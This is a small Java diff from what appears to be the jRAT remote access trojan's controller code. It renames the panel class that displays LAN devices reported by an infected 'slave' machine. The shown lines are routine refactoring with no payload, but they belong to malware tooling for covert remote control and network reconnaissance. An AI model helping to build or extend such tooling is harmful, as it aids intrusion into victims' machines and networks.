@@ -4,7 +4,7 @@ import java.io.DataInputStream;
 
 import pro.jrat.Slave;
 import pro.jrat.ui.frames.FrameControlPanel;
-import pro.jrat.ui.panels.PanelControlLANComputers;
+import pro.jrat.ui.panels.PanelControlLANScan;
 
 
 public class Packet49LanDevices extends AbstractIncomingPacket {
@@ -15,10 +15,10 @@ public class Packet49LanDevices extends AbstractIncomingPacket {
 		String second;
 		
 		FrameControlPanel frame = FrameControlPanel.instances.get(slave);	
-		PanelControlLANComputers panel = null;
+		PanelControlLANScan panel = null;
 		
 		if (frame != null) {
-			panel = (PanelControlLANComputers) frame.panels.get("lan computers");
+			panel = (PanelControlLANScan) frame.panels.get("lan computers");
 		}
 		
 		if (first.equals("DONE")) {
